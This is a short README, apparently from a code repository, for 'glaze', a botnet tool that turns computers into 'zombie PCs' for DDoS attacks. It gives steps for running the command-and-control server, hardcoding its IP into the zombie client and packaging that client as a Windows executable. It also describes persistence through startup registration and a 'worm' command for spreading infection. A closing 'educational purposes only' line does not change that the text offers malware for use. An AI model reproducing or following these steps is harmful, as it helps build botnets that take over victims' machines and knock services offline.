
# About this project...
This is a tool designed to create "zombie PCs" and enable Distributed Denial of Service (DDoS) attacks.

# How to use...
Install the required modules:
```
pip install -r requirements.txt
```
Run `glaze-cnc.py` (or run it on a server if you have one).

Enter the server's IP address into the CNC-IP section of `glaze-zombie.py`.

Build it into an executable (exe):
```
pyinstaller glaze-zombie.py
```

# How it works...
It registers itself to the system startup programs; entering "worm" in the CNC interface infects the local computer.

# Warning!!
This project is for educational purposes only. Using it for attacks is illegal, and the user bears full responsibility for any such use.
